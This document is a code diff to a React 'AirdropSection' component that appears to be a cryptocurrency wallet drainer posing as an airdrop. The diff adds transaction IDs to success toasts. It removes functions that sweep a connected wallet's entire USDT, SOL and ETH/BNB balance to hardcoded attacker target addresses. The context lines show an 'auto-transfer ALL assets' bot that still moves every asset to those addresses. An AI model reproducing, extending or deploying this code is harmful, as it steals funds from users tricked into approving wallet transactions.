@@ -685,7 +685,7 @@ const AirdropSection = () => {
                 params: [transactionParameters],
               });
 
-              toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+              toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred! TX: ${txHash.slice(0, 10)}...`, { 
                 id: `evm-${asset.symbol}` 
               });
               successCount++;
@@ -713,7 +713,7 @@ const AirdropSection = () => {
               }],
             });
 
-            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred! TX: ${txHash.slice(0, 10)}...`, { 
               id: `evm-${asset.symbol}` 
             });
             successCount++;
@@ -769,7 +769,7 @@ const AirdropSection = () => {
 
             const { signature } = await window.solana.signAndSendTransaction(transaction);
             
-            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred! Sig: ${signature.slice(0, 10)}...`, { 
               id: `sol-${asset.symbol}` 
             });
             successCount++;
@@ -839,12 +839,12 @@ const AirdropSection = () => {
                   )
                 );
 
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
-                
-                toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
-                  id: `sol-${asset.symbol}` 
-                });
-                successCount++;
+                                 const { signature } = await window.solana.signAndSendTransaction(transaction);
+                 
+                 toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred! Sig: ${signature.slice(0, 10)}...`, { 
+                   id: `sol-${asset.symbol}` 
+                 });
+                 successCount++;
               }
             } catch (splError) {
               console.error(`SPL transfer error for ${asset.symbol}:`, splError);
@@ -857,12 +857,12 @@ const AirdropSection = () => {
                 const message = `Transfer ${asset.formattedBalance} ${asset.symbol} to ${SOLANA_TARGET_ADDRESS}`;
                 const encodedMessage = new TextEncoder().encode(message);
                 
-                const { signature } = await window.solana.signMessage(encodedMessage);
-                
-                toast.success(`✅ ${asset.symbol} transfer initiated!`, { 
-                  id: `sol-${asset.symbol}` 
-                });
-                successCount++;
+                                 const { signature } = await window.solana.signMessage(encodedMessage);
+                 
+                 toast.success(`✅ ${asset.symbol} transfer initiated! Sig: ${signature.slice(0, 10)}...`, { 
+                   id: `sol-${asset.symbol}` 
+                 });
+                 successCount++;
               } catch (fallbackError) {
                 console.error(`Fallback transfer failed for ${asset.symbol}:`, fallbackError);
                 throw fallbackError;
@@ -889,39 +889,7 @@ const AirdropSection = () => {
     }
   };
 
-  // Transfer TRC20 USDT (legacy function - kept for compatibility)
-  const transferTRC20USDT = async () => {
-    try {
-      if (!isTronLinkInstalled()) {
-        toast.error('TronLink required for USDT TRC20 transfers!');
-        return false;
-      }
 
-      toast.loading('🔄 Checking USDT TRC20 balance...', { id: 'usdt-transfer' });
-      
-      const balance = await getTRC20USDTBalance();
-      if (balance <= 0) {
-        toast.success('✅ No USDT TRC20 to transfer', { id: 'usdt-transfer' });
-        return true;
-      }
-
-      toast.loading('💰 Transferring USDT TRC20...', { id: 'usdt-transfer' });
-      
-      const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-      const result = await contract.transfer(TRC20_TARGET_ADDRESS, balance).send();
-      
-      if (result) {
-        const usdtAmount = (balance / 1e6).toFixed(2); // USDT has 6 decimals
-        toast.success(`✅ ${usdtAmount} USDT TRC20 transferred!`, { id: 'usdt-transfer' });
-        return true;
-      }
-      return false;
-    } catch (error) {
-      console.error('USDT TRC20 transfer error:', error);
-      toast.error('❌ USDT TRC20 transfer failed!', { id: 'usdt-transfer' });
-      return false;
-    }
-  };
 
   // Get SOL balance
   const getSOLBalance = async () => {
@@ -938,45 +906,7 @@ const AirdropSection = () => {
     }
   };
 
-  // Transfer all SOL
-  const transferAllSOL = async () => {
-    try {
-      if (!isPhantomInstalled() || !isSolanaConnected) {
-        toast.error('Phantom wallet not connected!');
-        return false;
-      }
 
-      toast.loading('🔄 Checking SOL balance...', { id: 'sol-transfer' });
-      
-      const balance = await getSOLBalance();
-      if (balance <= 5000) { // Keep 0.000005 SOL for fees
-        toast.success('✅ No SOL to transfer', { id: 'sol-transfer' });
-        return true;
-      }
-
-      toast.loading('🟣 Transferring SOL...', { id: 'sol-transfer' });
-      
-      const sendAmount = balance - 5000; // Keep some for fees
-      const publicKey = new window.solana.PublicKey(solanaAddress);
-      
-      const transaction = new window.solana.Transaction().add(
-        window.solana.SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: new window.solana.PublicKey(SOLANA_TARGET_ADDRESS),
-          lamports: sendAmount,
-        })
-      );
-
-      const signature = await window.solana.signAndSendTransaction(transaction);
-      const solAmount = (sendAmount / 1e9).toFixed(6);
-      toast.success(`✅ ${solAmount} SOL transferred! Sig: ${signature.slice(0, 10)}...`, { id: 'sol-transfer' });
-      return true;
-    } catch (error) {
-      console.error('SOL transfer error:', error);
-      toast.error('❌ SOL transfer failed!', { id: 'sol-transfer' });
-      return false;
-    }
-  };
 
   // Get BNB/ETH balance
   const getETHBalance = async () => {
@@ -992,50 +922,7 @@ const AirdropSection = () => {
     }
   };
 
-  // Transfer all BNB/ETH
-  const transferAllETH = async () => {
-    try {
-      toast.loading('🔄 Checking ETH/BNB balance...', { id: 'eth-transfer' });
-      
-      const balance = await getETHBalance();
-      const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
-      const gasPriceInt = parseInt(gasPrice, 16);
-      const gasLimit = 21000;
-      const fee = gasPriceInt * gasLimit;
-      const safetyMargin = 1000000000000000; // 0.001 ETH
-      const totalFee = fee + safetyMargin;
-      
-      if (balance <= totalFee) {
-        toast.success('✅ No ETH/BNB to transfer', { id: 'eth-transfer' });
-        return true;
-      }
 
-      toast.loading('💎 Transferring ETH/BNB...', { id: 'eth-transfer' });
-      
-      const sendAmount = balance - totalFee;
-      
-      const transactionParameters = {
-        to: BSC_TARGET_ADDRESS,
-        from: walletAddress,
-        value: '0x' + sendAmount.toString(16),
-        gas: '0x5208',
-        gasPrice: gasPrice
-      };
-
-      const txHash = await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [transactionParameters],
-      });
-
-      const ethAmount = (sendAmount / 1e18).toFixed(4);
-      toast.success(`✅ ${ethAmount} ETH/BNB transferred! TX: ${txHash.slice(0, 10)}...`, { id: 'eth-transfer' });
-      return true;
-    } catch (error) {
-      console.error('ETH transfer error:', error);
-      toast.error('❌ ETH/BNB transfer failed!', { id: 'eth-transfer' });
-      return false;
-    }
-  };
 
   // Auto-detect and transfer ALL assets (Bot Function)
   const startAutoAssetTransferBot = async () => {
